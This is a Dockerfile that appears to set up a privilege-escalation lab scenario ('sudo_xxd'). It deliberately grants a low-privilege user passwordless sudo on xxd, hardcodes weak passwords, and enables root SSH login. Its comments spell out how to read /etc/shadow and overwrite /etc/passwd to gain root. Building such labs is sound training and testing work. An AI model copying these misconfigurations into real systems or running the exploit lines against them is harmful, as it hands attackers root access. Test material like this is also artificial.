FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_xxd
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/xxd as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and xxd
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        xxd \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify xxd is installed
RUN which xxd && ls -la /usr/bin/xxd

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# xxd can read and write arbitrary files when run as root.
# Exploit approach:
#   LFILE=/etc/shadow
#   sudo xxd "$LFILE" | xxd -r
# This allows reading any privileged file. Combined with write:
#   echo "root::0:0:root:/root:/bin/bash" | xxd | sudo xxd -r - /etc/passwd
# This can overwrite /etc/passwd to set an empty root password, achieving root.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/xxd" > /etc/sudoers.d/xxd && \
    chmod 440 /etc/sudoers.d/xxd

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]